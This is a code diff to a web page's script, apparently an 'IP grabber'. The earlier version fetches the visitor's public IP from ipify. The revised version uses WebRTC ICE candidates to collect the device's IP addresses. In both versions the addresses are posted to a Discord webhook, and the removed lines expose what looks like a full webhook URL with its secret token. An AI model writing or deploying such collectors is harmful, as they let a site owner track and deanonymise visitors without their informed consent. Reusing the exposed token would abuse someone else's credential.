@@ -74,32 +74,42 @@
 
   <script>
     // JavaScript code to retrieve user's IP address and send it to a Discord webhook
-    const ipButton = document.getElementById('ipButton');
-    const webhookUrl = 'https://discord.com/api/webhooks/1367882547408670932/ehZsUOmEPIn0S2f8ghATNlDJ_Et8rrK2WjnKmwCE2-NfU56oMFNRPkstIRXX-1Nwcfh9'; // Replace with your Discord webhook URL
+const ipButton = document.getElementById('ipButton');
+const webhookUrl = 'https://discord.com/api/webhooks/...'; // Replace with your Discord webhook URL
 
-    ipButton.addEventListener('click', async () => {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        const ipAddress = data.ip;
+ipButton.addEventListener('click', async () => {
+  try {
+    const peerConnection = new RTCPeerConnection({ iceServers: [] });
+    const dataChannel = peerConnection.createDataChannel('');
 
-        // Send the IP address to the Discord webhook
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `User's IP address: ${ipAddress}`,
-          }),
-        });
-
-        alert('IP address sent to Discord webhook successfully!');
-      } catch (error) {
-        console.error('Error:', error);
-        alert('An error occurred while retrieving the IP address.');
+    peerConnection.onicecandidate = (event) => {
+      if (event.candidate) {
+        const candidate = event.candidate;
+        const address = candidate.address;
+        if (address) {
+          // Send the device's IP address to the Discord webhook
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              content: `User's device IP address: ${address}`,
+            }),
+          });
+          alert('Device IP address sent to Discord webhook successfully!');
+        }
       }
+    };
+
+    peerConnection.createOffer().then((offer) => {
+      peerConnection.setLocalDescription(offer);
     });
+  } catch (error) {
+    console.error('Error:', error);
+    alert('An error occurred while retrieving the device IP address.');
+  }
+});
   </script>
 </body>
 </html>
